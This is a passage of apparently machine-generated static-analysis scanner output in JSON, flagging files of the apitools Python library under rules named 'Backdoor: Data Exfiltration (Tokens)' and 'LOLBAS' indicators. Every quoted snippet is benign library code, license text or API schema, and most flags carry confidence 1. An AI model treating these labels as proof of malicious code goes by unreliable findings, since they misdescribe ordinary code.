                      "markdown": "`h2\\nService Account API.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n          \"type\": \"string\"\n        },\n        \"privateKeyType\": {\n          \"description\": \"The output format for the private key.\\nOnly provided in `CreateServiceAccountKey` responses, not\\nin `GetServiceAccountKey` or `ListServiceAccountKey` responses.\\n\\nGoogle never exposes system-managed private keys, and never retains\\nuser-managed private keys.\",\n `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 6,
                  "endLine": 66,
                  "endColumn": 16,
                  "snippet": {
                    "text": "      \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n      \"location\": \"query\"\n    },\n    \"oauth_token\": {\n      \"type\": \"string\",\n      \"description\": \"OAuth 2.0 token for the current user.\",\n      \"location\": \"query\"\n",
                    "rendered": {
                      "text": "      \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n      \"location\": \"query\"\n    },\n    \"oauth_token\": {\n      \"type\": \"string\",\n      \"description\": \"OAuth 2.0 token for the current user.\",\n      \"location\": \"query\"\n",
                      "markdown": "`      \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n      \"location\": \"query\"\n    },\n    \"oauth_token\": {\n      \"type\": \"string\",\n      \"description\": \"OAuth 2.0 token for the current user.\",\n      \"location\": \"query\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/__init__.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 38,
                  "endLine": 6,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/descriptor.py"
                },
                "region": {
                  "startLine": 126,
                  "startColumn": 17,
                  "endLine": 126,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\n\n# NOTE: MessageField is missing because message fields cannot have\n# a default value at this time.\n# TODO(rafek): Support default message values.\n#\n# Map to functions that convert default values of fields of a given type\n",
                    "rendered": {
                      "text": "\n\n# NOTE: MessageField is missing because message fields cannot have\n# a default value at this time.\n# TODO(rafek): Support default message values.\n#\n# Map to functions that convert default values of fields of a given type\n",
                      "markdown": "`\n\n# NOTE: MessageField is missing because message fields cannot have\n# a default value at this time.\n# TODO(rafek): Support default message values.\n#\n# Map to functions that convert default values of fields of a given type\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/descriptor.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/descriptor.py"
                },
                "region": {
                  "startLine": 604,
                  "startColumn": 45,
                  "endLine": 604,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        descriptors if provided descriptor loader.\n\n        Args:\n          definition_name: Definition name to find package for.\n\n        \"\"\"\n        while True:\n",
                    "rendered": {
                      "text": "        descriptors if provided descriptor loader.\n\n        Args:\n          definition_name: Definition name to find package for.\n\n        \"\"\"\n        while True:\n",
                      "markdown": "`        descriptors if provided descriptor loader.\n\n        Args:\n          definition_name: Definition name to find package for.\n\n        \"\"\"\n        while True:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/descriptor.py"
                },
                "region": {
                  "startLine": 594,
                  "startColumn": 26,
                  "endLine": 594,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            return definition\n        else:\n            raise messages.DefinitionNotFoundError(\n                'Could not find definition for %s' % definition_name)\n\n    def lookup_package(self, definition_name):\n        \"\"\"Determines the package name for any definition.\n",
                    "rendered": {
                      "text": "            return definition\n        else:\n            raise messages.DefinitionNotFoundError(\n                'Could not find definition for %s' % definition_name)\n\n    def lookup_package(self, definition_name):\n        \"\"\"Determines the package name for any definition.\n",
                      "markdown": "`            return definition\n        else:\n            raise messages.DefinitionNotFoundError(\n                'Could not find definition for %s' % definition_name)\n\n    def lookup_package(self, definition_name):\n        \"\"\"Determines the package name for any definition.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/descriptor.py"
                },
                "region": {
                  "startLine": 572,
                  "startColumn": 18,
                  "endLine": 572,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        \"\"\"Lookup descriptor by name.\n\n        Get descriptor from library by name.  If descriptor is not found will\n        attempt to find via descriptor loader if provided.\n\n        Args:\n          definition_name: Definition name to find.\n",
                    "rendered": {
                      "text": "        \"\"\"Lookup descriptor by name.\n\n        Get descriptor from library by name.  If descriptor is not found will\n        attempt to find via descriptor loader if provided.\n\n        Args:\n          definition_name: Definition name to find.\n",
                      "markdown": "`        \"\"\"Lookup descriptor by name.\n\n        Get descriptor from library by name.  If descriptor is not found will\n        attempt to find via descriptor loader if provided.\n\n        Args:\n          definition_name: Definition name to find.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/descriptor.py"
                },
                "region": {
                  "startLine": 507,
                  "startColumn": 52,
                  "endLine": 507,
                  "endColumn": 58,
                  "snippet": {
                    "text": "                return describe(module)\n\n    try:\n        # Attempt to use messages.find_definition to find item.\n        return describe(messages.find_definition(definition_name,\n                                                 importer=__import__))\n    except messages.DefinitionNotFoundError as err:\n",
                    "rendered": {
                      "text": "                return describe(module)\n\n    try:\n        # Attempt to use messages.find_definition to find item.\n        return describe(messages.find_definition(definition_name,\n                                                 importer=__import__))\n    except messages.DefinitionNotFoundError as err:\n",
                      "markdown": "`                return describe(module)\n\n    try:\n        # Attempt to use messages.find_definition to find item.\n        return describe(messages.find_definition(definition_name,\n                                                 importer=__import__))\n    except messages.DefinitionNotFoundError as err:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/descriptor.py"
                },
                "region": {
                  "startLine": 404,
                  "startColumn": 30,
                  "endLine": 404,
                  "endColumn": 35,
                  "snippet": {
                    "text": "    message_descriptors = []\n    enum_descriptors = []\n\n    # Need to iterate over all top level attributes of the module looking for\n    # message and enum definitions.  Each definition must be itself described.\n    for name in sorted(dir(module)):\n        value = getattr(module, name)\n",
                    "rendered": {
                      "text": "    message_descriptors = []\n    enum_descriptors = []\n\n    # Need to iterate over all top level attributes of the module looking for\n    # message and enum definitions.  Each definition must be itself described.\n    for name in sorted(dir(module)):\n        value = getattr(module, name)\n",
                      "markdown": "`    message_descriptors = []\n    enum_descriptors = []\n\n    # Need to iterate over all top level attributes of the module looking for\n    # message and enum definitions.  Each definition must be itself described.\n    for name in sorted(dir(module)):\n        value = getattr(module, name)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/descriptor.py"
                },
                "region": {
                  "startLine": 20,
                  "startColumn": 57,
                  "endLine": 21,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\n\"\"\"Services descriptor definitions.\n\nContains message definitions and functions for converting\nservice classes into transmittable message format.\n\nDescribing an Enum instance, Enum class, Field class or Message class will\ngenerate an appropriate descriptor object that describes that class.\n",
                    "rendered": {
                      "text": "\n\"\"\"Services descriptor definitions.\n\nContains message definitions and functions for converting\nservice classes into transmittable message format.\n\nDescribing an Enum instance, Enum class, Field class or Message class will\ngenerate an appropriate descriptor object that describes that class.\n",
                      "markdown": "`\n\"\"\"Services descriptor definitions.\n\nContains message definitions and functions for converting\nservice classes into transmittable message format.\n\nDescribing an Enum instance, Enum class, Field class or Message class will\ngenerate an appropriate descriptor object that describes that class.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 2114,
                  "startColumn": 16,
                  "endLine": 2114,
                  "endColumn": 22,
                  "snippet": {
                    "text": "        aA = self.DefineMessage('a', 'A')\n        aaA = self.DefineMessage('a.a', 'A')\n\n        # Always find a.A.\n        self.assertEquals(aA, messages.find_definition('.a.A', None,\n                                                       importer=self.Importer))\n        self.assertEquals(aA, messages.find_definition('.a.A', a,\n",
                    "rendered": {
                      "text": "        aA = self.DefineMessage('a', 'A')\n        aaA = self.DefineMessage('a.a', 'A')\n\n        # Always find a.A.\n        self.assertEquals(aA, messages.find_definition('.a.A', None,\n                                                       importer=self.Importer))\n        self.assertEquals(aA, messages.find_definition('.a.A', a,\n",
                      "markdown": "`        aA = self.DefineMessage('a', 'A')\n        aaA = self.DefineMessage('a.a', 'A')\n\n        # Always find a.A.\n        self.assertEquals(aA, messages.find_definition('.a.A', None,\n                                                       importer=self.Importer))\n        self.assertEquals(aA, messages.find_definition('.a.A', a,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 2094,
                  "startColumn": 9,
                  "endLine": 2094,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        self.assertEquals(D, messages.find_definition(\n            'D', C, importer=self.Importer))\n\n        # Find relative to C searching from c.\n        self.assertEquals(A, messages.find_definition(\n            'b.A', C, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                    "rendered": {
                      "text": "        self.assertEquals(D, messages.find_definition(\n            'D', C, importer=self.Importer))\n\n        # Find relative to C searching from c.\n        self.assertEquals(A, messages.find_definition(\n            'b.A', C, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                      "markdown": "`        self.assertEquals(D, messages.find_definition(\n            'D', C, importer=self.Importer))\n\n        # Find relative to C searching from c.\n        self.assertEquals(A, messages.find_definition(\n            'b.A', C, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 2084,
                  "startColumn": 9,
                  "endLine": 2084,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        self.assertEquals(D, messages.find_definition(\n            'D', B, importer=self.Importer))\n\n        # Find relative to C.\n        self.assertEquals(A, messages.find_definition(\n            'A', C, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                    "rendered": {
                      "text": "        self.assertEquals(D, messages.find_definition(\n            'D', B, importer=self.Importer))\n\n        # Find relative to C.\n        self.assertEquals(A, messages.find_definition(\n            'A', C, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                      "markdown": "`        self.assertEquals(D, messages.find_definition(\n            'D', B, importer=self.Importer))\n\n        # Find relative to C.\n        self.assertEquals(A, messages.find_definition(\n            'A', C, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 2074,
                  "startColumn": 9,
                  "endLine": 2074,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        self.assertEquals(D, messages.find_definition(\n            'B.D', A, importer=self.Importer))\n\n        # Find relative to B.\n        self.assertEquals(A, messages.find_definition(\n            'A', B, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                    "rendered": {
                      "text": "        self.assertEquals(D, messages.find_definition(\n            'B.D', A, importer=self.Importer))\n\n        # Find relative to B.\n        self.assertEquals(A, messages.find_definition(\n            'A', B, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                      "markdown": "`        self.assertEquals(D, messages.find_definition(\n            'B.D', A, importer=self.Importer))\n\n        # Find relative to B.\n        self.assertEquals(A, messages.find_definition(\n            'A', B, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 2064,
                  "startColumn": 9,
                  "endLine": 2064,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        C = A.B.C\n        D = A.B.D\n\n        # Find relative to A.\n        self.assertEquals(A, messages.find_definition(\n            'A', A, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                    "rendered": {
                      "text": "        C = A.B.C\n        D = A.B.D\n\n        # Find relative to A.\n        self.assertEquals(A, messages.find_definition(\n            'A', A, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                      "markdown": "`        C = A.B.C\n        D = A.B.D\n\n        # Find relative to A.\n        self.assertEquals(A, messages.find_definition(\n            'A', A, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 2047,
                  "startColumn": 9,
                  "endLine": 2047,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        self.assertEquals(D, messages.find_definition(\n            'd.D', b, importer=self.Importer))\n\n        # Find A, B, C and D relative to c.  Module d is the same case as c.\n        self.assertEquals(A, messages.find_definition(\n            'A', c, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                    "rendered": {
                      "text": "        self.assertEquals(D, messages.find_definition(\n            'd.D', b, importer=self.Importer))\n\n        # Find A, B, C and D relative to c.  Module d is the same case as c.\n        self.assertEquals(A, messages.find_definition(\n            'A', c, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                      "markdown": "`        self.assertEquals(D, messages.find_definition(\n            'd.D', b, importer=self.Importer))\n\n        # Find A, B, C and D relative to c.  Module d is the same case as c.\n        self.assertEquals(A, messages.find_definition(\n            'A', c, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 2037,
                  "startColumn": 9,
                  "endLine": 2037,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        self.assertEquals(D, messages.find_definition(\n            'b.d.D', a, importer=self.Importer))\n\n        # Find A, B, C and D relative to b.\n        self.assertEquals(A, messages.find_definition(\n            'A', b, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                    "rendered": {
                      "text": "        self.assertEquals(D, messages.find_definition(\n            'b.d.D', a, importer=self.Importer))\n\n        # Find A, B, C and D relative to b.\n        self.assertEquals(A, messages.find_definition(\n            'A', b, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                      "markdown": "`        self.assertEquals(D, messages.find_definition(\n            'b.d.D', a, importer=self.Importer))\n\n        # Find A, B, C and D relative to b.\n        self.assertEquals(A, messages.find_definition(\n            'A', b, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 2027,
                  "startColumn": 9,
                  "endLine": 2027,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        C = self.DefineMessage('a.b.c', 'C')\n        D = self.DefineMessage('a.b.d', 'D')\n\n        # Find A, B, C and D relative to a.\n        self.assertEquals(A, messages.find_definition(\n            'A', a, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                    "rendered": {
                      "text": "        C = self.DefineMessage('a.b.c', 'C')\n        D = self.DefineMessage('a.b.d', 'D')\n\n        # Find A, B, C and D relative to a.\n        self.assertEquals(A, messages.find_definition(\n            'A', a, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n",
                      "markdown": "`        C = self.DefineMessage('a.b.c', 'C')\n        D = self.DefineMessage('a.b.d', 'D')\n\n        # Find A, B, C and D relative to a.\n        self.assertEquals(A, messages.find_definition(\n            'A', a, importer=self.Importer))\n        self.assertEquals(B, messages.find_definition(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 1908,
                  "startColumn": 11,
                  "endLine": 1908,
                  "endColumn": 17,
                  "snippet": {
                    "text": "        \"\"\"\n        name_path = name.split('.')\n        full_path = []\n        for node in name_path:\n            full_path.append(node)\n            full_name = '.'.join(full_path)\n            self.modules.setdefault(full_name, types.ModuleType(full_name))\n",
                    "rendered": {
                      "text": "        \"\"\"\n        name_path = name.split('.')\n        full_path = []\n        for node in name_path:\n            full_path.append(node)\n            full_name = '.'.join(full_path)\n            self.modules.setdefault(full_name, types.ModuleType(full_name))\n",
                      "markdown": "`        \"\"\"\n        name_path = name.split('.')\n        full_path = []\n        for node in name_path:\n            full_path.append(node)\n            full_name = '.'.join(full_path)\n            self.modules.setdefault(full_name, types.ModuleType(full_name))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 1390,
                  "startColumn": 35,
                  "endLine": 1390,
                  "endColumn": 41,
                  "snippet": {
                    "text": "        ComplexMessage = self.CreateMessageClass()\n        fields = list(ComplexMessage.all_fields())\n\n        # Order does not matter, so sort now.\n        fields = sorted(fields, key=lambda f: f.name)\n\n        self.assertEquals(3, len(fields))\n",
                    "rendered": {
                      "text": "        ComplexMessage = self.CreateMessageClass()\n        fields = list(ComplexMessage.all_fields())\n\n        # Order does not matter, so sort now.\n        fields = sorted(fields, key=lambda f: f.name)\n\n        self.assertEquals(3, len(fields))\n",
                      "markdown": "`        ComplexMessage = self.CreateMessageClass()\n        fields = list(ComplexMessage.all_fields())\n\n        # Order does not matter, so sort now.\n        fields = sorted(fields, key=lambda f: f.name)\n\n        self.assertEquals(3, len(fields))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 1074,
                  "startColumn": 11,
                  "endLine": 1074,
                  "endColumn": 16,
                  "snippet": {
                    "text": "                          10)\n\n        class Color(messages.Enum):\n            RED = 1\n            GREEN = 2\n            BLUE = 3\n\n",
                    "rendered": {
                      "text": "                          10)\n\n        class Color(messages.Enum):\n            RED = 1\n            GREEN = 2\n            BLUE = 3\n\n",
                      "markdown": "`                          10)\n\n        class Color(messages.Enum):\n            RED = 1\n            GREEN = 2\n            BLUE = 3\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages_test.py"
                },
                "region": {
                  "startLine": 78,
                  "startColumn": 11,
                  "endLine": 78,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n        # pylint:disable=unused-variable\n        class Color(messages.Enum):\n            RED = 20\n            ORANGE = 2\n            YELLOW = 40\n            GREEN = 4\n",
                    "rendered": {
                      "text": "\n        # pylint:disable=unused-variable\n        class Color(messages.Enum):\n            RED = 20\n            ORANGE = 2\n            YELLOW = 40\n            GREEN = 4\n",
